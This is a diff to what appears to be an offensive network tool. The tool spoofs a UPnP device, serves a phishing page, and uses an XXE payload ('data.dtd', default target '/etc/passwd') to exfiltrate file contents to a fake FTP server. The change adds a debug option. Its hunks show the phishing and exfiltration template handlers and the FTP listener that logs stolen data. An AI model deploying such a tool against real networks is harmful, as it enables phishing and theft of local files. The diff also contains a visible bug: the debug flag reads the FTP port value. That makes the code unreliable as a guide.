@@ -55,10 +55,6 @@ if sys.version_info < (3, 0):
     print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
     sys.exit(1)
 
-ftpd = None
-dt_date = datetime.now()
-random_str = dt_date.strftime("%Y-%m-%d-%H-%M-%S-%f")
-
 
 class PC:
     """PC (Print Color)
@@ -225,6 +221,9 @@ def build_class(upnp_args):
     local_port = upnp_args['local_port']
     xxe_lfi = upnp_args['xxe_lfi']
     ftp_port = upnp_args['ftp_port']
+    debug = upnp_args['ftp_port']
+    dt_date = datetime.now()
+    random_str = dt_date.strftime("%Y-%m-%d-%H-%M-%S-%f")
 
     class UPNPObject(BaseHTTPRequestHandler):
         """Spoofed UPnP object
@@ -255,7 +254,8 @@ def build_class(upnp_args):
             file_in = open(template_dir + '/device.xml')
             template = Template(file_in.read())
             xml_file = template.substitute(variables)
-            print(xml_file)
+            if debug:
+              print(xml_file)
             return xml_file
 
         @staticmethod
@@ -272,6 +272,8 @@ def build_class(upnp_args):
                 xml_file = template.substitute(variables)
             else:
                 xml_file = '.'
+            if debug:
+              print(xml_file)
             return xml_file
 
         @staticmethod
@@ -284,6 +286,8 @@ def build_class(upnp_args):
             file_in = open(template_dir + '/present.html')
             template = Template(file_in.read())
             phish_page = template.substitute(variables)
+            if debug:
+              print(phish_page)
             return phish_page
 
         @staticmethod
@@ -302,7 +306,8 @@ def build_class(upnp_args):
             file_in = open(template_dir + '/data.dtd')
             template = Template(file_in.read())
             exfil_page = template.substitute(variables)
-            print(exfil_page)
+            if debug:
+              print(exfil_page)
             return exfil_page
 
         def handle(self):
@@ -499,7 +504,7 @@ class FTPserverThread(threading.Thread):
             if not data:
                 break
             else:
-                print(PC.red + "FTP: recvd" +PC.endc + "'%s'" % data.strip().decode("ascii"))
+                print(PC.red + "[FTP: recv] " +PC.endc + "%s" % data.strip().decode("ascii"))
                 if str.encode("LIST") in data:
                     self.conn.send(str.encode("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test\r\n"))
                     self.conn.send(str.encode("150 Opening BINARY mode data connection for /bin/ls\r\n"))
@@ -544,8 +549,10 @@ def process_args():
                         help='Port for FTP server. Defaults to 2121.')
     parser.add_argument('-f', '--file', type=str, action='store',
 			default='/etc/passwd',
-			help=('Name of a file for template change'
-			      'useful for caching and turning it off.'))
+			help=('Name of a file - useful as field from command line.'))
+    parser.add_argument('-d', '--debug', action="store_true",
+                        default=False,
+                        help=('Enable debug mode.'))
     parser.add_argument('-t', '--template', type=str, action='store',
                         default='office365',
                         help=('Name of a folder in the templates directory. '
@@ -705,6 +712,7 @@ def main():
                  'xxe_lfi':args.file,
                  'ftp_port':args.ftp,
                  'realm':args.realm,
+                 'debug':args.debug,
                  'local_port':args.local_port}
 
     upnp = build_class(upnp_args)
@@ -714,6 +722,7 @@ def main():
 
     print_details(args, local_ip, smb_server)
 
+    ftpd = None
     try:
         t_ftpd = FTPserver(local_ip,args.ftp)
         t_ftpd.setDaemon(True)
